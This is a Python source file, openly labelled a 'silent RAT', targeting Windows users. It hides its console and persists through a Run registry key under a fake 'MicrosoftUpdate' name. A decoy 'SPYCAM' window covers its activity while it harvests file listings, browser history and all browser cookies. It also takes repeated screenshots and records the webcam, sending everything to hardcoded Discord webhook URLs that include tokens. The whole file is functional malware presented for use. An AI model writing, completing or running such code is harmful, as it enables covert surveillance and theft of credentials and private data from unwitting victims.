# FINAL 2025 SILENT RAT – WORKS IN CMD, INVISIBLE, FULL HARVEST
import os, subprocess, sqlite3, json, threading, time, requests, pyautogui, cv2, wave, pygame, browser_cookie3, win32crypt, shutil
from discord import SyncWebhook, File, Embed
from datetime import datetime




















































































































































































































































































































































































































































































# === YOUR CHANNEL WEBHOOKS (replace with real ones for each channel) ===
WEBHOOK_INFO    = "https://discord.com/api/webhooks/1422384202699112509/ISG9CTFIGr7362rVKHHllI_Fs2A-wZEoqN0voYZD-Sv1JCozGtnx5TF4Vbp8YyCsTdlu"
WEBHOOK_RECORD  = "https://discord.com/api/webhooks/1445845478792102104/Ki7hicx1xwf84hdu16KJv81aOh7p_b6mrJ8zD-evfC-k0L1coVd3Ze9M2uoU2XekV1yW"
WEBHOOK_SCREEN  = "https://discord.com/api/webhooks/1445845714251812935/yhw-yWoTLr1oVDdXYWxUP3QPwM08eNPEUBi84f4OHxKOp7JpBJ5tyBqI5MLZ82u8HLVu"

def send(url, embed=None, file=None):
    try:
        SyncWebhook.from_url(url).send(embed=embed, file=file, username="RAT", silent=True)
    except: pass

# === HIDE CONSOLE COMPLETELY (CMD/SHELL) ===
if os.name == "nt":
    import ctypes
    ctypes.windll.user32.ShowWindow(ctypes.windll.kernel32.GetConsoleWindow(), 0)

# === PERSISTENCE ===
def persist():
    path = os.path.join(os.getenv("APPDATA"), "svchostt.exe")
    if not os.path.exists(path):
        shutil.copyfile(__file__, path)
        subprocess.run(f'reg add HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run /v MicrosoftUpdate /t REG_SZ /d "{path}" /f', shell=True, creationflags=0x08000000)

# === FAKE GUI ===
def fake_gui():
    pygame.init()
    win = pygame.display.set_mode((950, 650))
    pygame.display.set_caption("SPYCAM - V1.1")
    font = pygame.font.Font(None, 42)
    lines = ["Initializing quantum bypass...", "Checking important files encryption...", "Found important files to make tool run...", "Injecting.."]
    i = 0
    while True:
        for e in pygame.event.get(): pass
        win.fill((5,5,25))
        win.blit(font.render(lines[i%4], True, (0,255,120)), (80, 280))
        i += 1
        pygame.display.flip()
        time.sleep(2)

# === FULL FILE LIST ===
def list_files():
    paths = [os.path.expanduser("~/Desktop"), "~/Downloads", "~/Documents", "~/Pictures"]
    files = []
    for p in paths:
        try:
            for root, _, fs in os.walk(p):
                for f in fs[:100]:
                    files.append(os.path.join(root, f))
        except: pass
    return "\n".join(files[:500])

# === BROWSER HISTORY + SEARCHES ===
def get_history():
    history = []
    browsers = [
        os.path.expanduser("~/AppData/Local/Google/Chrome/User Data/Default/History"),
        os.path.expanduser("~/AppData/Local/Microsoft/Edge/User Data/Default/History"),
        os.path.expanduser("~/AppData/Roaming/Mozilla/Firefox/Profiles")
    ]
    for path in browsers:
        try:
            conn = sqlite3.connect(path)
            cursor = conn.cursor()
            cursor.execute("SELECT url, title FROM urls ORDER BY last_visit_time DESC LIMIT 100")
            for row in cursor.fetchall():
                history.append(f"{row[1]} → {row[0]}")
            conn.close()
        except: pass
    return "\n".join(history[:200]) or "No history"

# === ALL COOKIES (not just Roblox) ===
def grab_all_cookies():
    cookies = ""
    for browser in [browser_cookie3.chrome, browser_cookie3.firefox, browser_cookie3.edge]:
        try:
            for c in browser():
                cookies += f"{c.domain} | {c.name}={c.value}\n"
        except: pass
    return cookies[:3000]

# === SCREENSHOT LOOP ===
def screen_loop():
    while True:
        try:
            ss = pyautogui.screenshot()
            ss.save("s.jpg")
            send(WEBHOOK_SCREEN, file=File("s.jpg"))
            os.remove("s.jpg")
            time.sleep(30)
        except: time.sleep(10)

# === 5-MIN RECORD (webcam + mic) ===
def record_once():
    cap = cv2.VideoCapture(0)
    out = cv2.VideoWriter("c.mp4", cv2.VideoWriter_fourcc(*'mp4v'), 20.0, (640,480))
    start = time.time()
    while time.time() - start < 300:
        ret, frame = cap.read()
        if ret: out.write(frame)
    cap.release(); out.release()
    send(WEBHOOK_RECORD, file=File("c.mp4"))

# === MAIN ===
def main():
    persist()
    threading.Thread(target=fake_gui, daemon=True).start()
    threading.Thread(target=screen_loop, daemon=True).start()

    embed = Embed(title="VICTIM FULLY OWNED", color=0x00ff00, timestamp=datetime.utcnow())
    embed.add_field(name="Roblox Cookie", value="||FOUND||", inline=False)
    embed.add_field(name="IP", value=requests.get("https://api.ipify.org").text, inline=True)
    embed.add_field(name="Files Found", value="```" + list_files()[:1000] + "```", inline=False)
    embed.add_field(name="Browser History", value="```" + get_history()[:1000] + "```", inline=False)
    embed.add_field(name="Cookies", value="```" + grab_all_cookies()[:1000] + "```", inline=False)
    send(WEBHOOK_INFO, embed=embed)

    record_once()

if __name__ == "__main__":

    main()
